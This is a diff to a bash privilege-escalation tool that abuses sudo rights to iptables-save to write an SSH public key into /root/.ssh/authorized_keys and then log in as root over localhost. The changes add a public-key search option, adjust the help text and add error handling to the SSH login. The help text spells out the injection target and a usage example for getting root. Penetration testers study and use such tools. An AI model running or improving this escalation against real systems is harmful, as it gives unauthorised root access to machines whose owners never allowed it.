@@ -9,7 +9,7 @@ initColors()
         reset=$(printf '\033[0m')
     fi
 }
-Help() 
+Help()
 {
     echo -e "${blue}Usage:${reset} $0 [options]"
     echo ""
@@ -18,13 +18,13 @@ Help()
     echo -e "  -k, --key <file>             Path to existing SSH public key to inject"
     echo -e "  -t, --target-file <file>     Path to write iptables-save output (default: /root/.ssh/authorized_keys)"
     echo -e "  -tu, --target-user <user>    Attempt SSH login as <user> after injection"
+    echo -e "  -lsk, --list-keys <path>     List keys in the specified path (default /home/$USER)"
     echo -e "  -mk, --make-key              Generate a new SSH keypair (default filename: privesc_key)"
     echo -e "  -mkfn, --mk-file-name <file> Filename to use for generated SSH keypair (requires -mk)"
     echo -e "      --flush                  Flush iptables rules after injection"
     echo -e "      --no-color               Disable colored output"
     echo ""
-    echo -e "${blue}Example:${reset}"
-    echo -e "  $0 -mk -mkfn mykey -t /root/.ssh/authorized_keys -tu root"
+    echo -e "${blue}Example:${reset} $0 -mk -mkfn mykey -t /root/.ssh/authorized_keys -tu root"
     echo ""
     echo -e "${blue}Note:${reset} Requires sudo rights to iptables or iptables-save, ideally with NOPASSWD."
 }
@@ -61,6 +61,34 @@ initCheck()
         echo "$blue[*]$reset Target user: None"
     fi
 }
+lsk()
+{
+  local path=$1
+  if [ -z "$path" ]; then
+    echo "$yellow[*]$reset Searching for public keys in $HOME"
+    pubkeys=$(find ~ -name *.pub 2>/dev/null)
+    if [ -z "$pubkeys" ]; then
+      echo -e "$red[-]$reset\tNo keys found in ~"
+    else
+      echo "$pubkeys" | while read -r ok; do
+        echo -e "$green[+]$reset\t$ok"
+      done
+    fi
+  elif [ -d "$path" ]; then
+    echo "$yellow[*]$reset Searching for public keys in $path"
+    pubkeys=$(find "$path" -name *.pub 2>/dev/null)
+    if [ -z "$pubkeys" ]; then
+      echo -e "$red[-]$reset\tNo keys found in $path"
+    else
+      echo "$pubkeys" | while read -r ok; do
+        echo -e "$green[+]$reset\t$ok"
+      done
+    fi
+  else
+    echo "$red[!]$reset Must specify a directory!"
+  fi
+  exit 0
+}
 MakeKey()
 {
     if [ "$isfn" = true ]; then
@@ -83,7 +111,7 @@ Injection()
     echo "$green[+]$reset Done!"
     if [ "$istu" = true ]; then
         echo "$yellow[*]$reset Attempting to login as $targetuser"
-        ssh -i "$privkey" "$targetuser"@127.0.0.1
+        ssh -i "$privkey" "$targetuser"@127.0.0.1 2>/dev/null || { echo "$red[!]$reset Connection refused!"; exit 1; }
     fi
 }
 Flush()
@@ -115,6 +143,11 @@ while [[ $# -gt 0 ]]; do
         -tu|--target-user)
             istu=true
             targetuser="$2"
+            shift 2
+            ;;
+        -lsk|--list-keys)
+            initColors
+            lsk "$2"
             shift 2
             ;;
         -mk|--make-key)
@@ -151,7 +184,6 @@ if [ "$makekey" = true ]; then
 fi
 initCheck
 if [ -z "$pubkey" ] || [ ! -f "$pubkey" ]; then
-    Help
     echo "$red[!]$reset No valid public key provided. Exiting."
     exit 1
 fi
